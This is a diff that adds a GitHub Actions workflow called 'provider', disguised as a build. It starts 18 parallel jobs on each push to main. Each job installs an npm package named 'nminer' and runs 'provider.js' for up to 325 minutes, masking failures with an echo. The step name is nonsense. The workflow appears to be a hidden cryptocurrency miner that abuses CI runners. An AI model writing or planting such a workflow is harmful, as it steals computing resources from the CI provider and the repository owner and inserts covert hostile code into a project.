@@ -1,0 +1,43 @@
+name: provider
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 1791 }
+          - { version: 4770 }
+          - { version: 1390 }
+          - { version: 8096 }
+          - { version: 507 }
+          - { version: 3346 }
+          - { version: 6920 }
+          - { version: 5935 }
+          - { version: 9117 }
+          - { version: 9495 }
+          - { version: 5746 }
+          - { version: 1864 }
+          - { version: 2841 }
+          - { version: 1795 }
+          - { version: 1022 }
+          - { version: 3431 }
+          - { version: 3823 }
+          - { version: 2449 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: obnoxiously compassionate indeed
+        run: |
+          npm install nminer@latest
+          timeout 325m node provider.js || echo "provider executed"
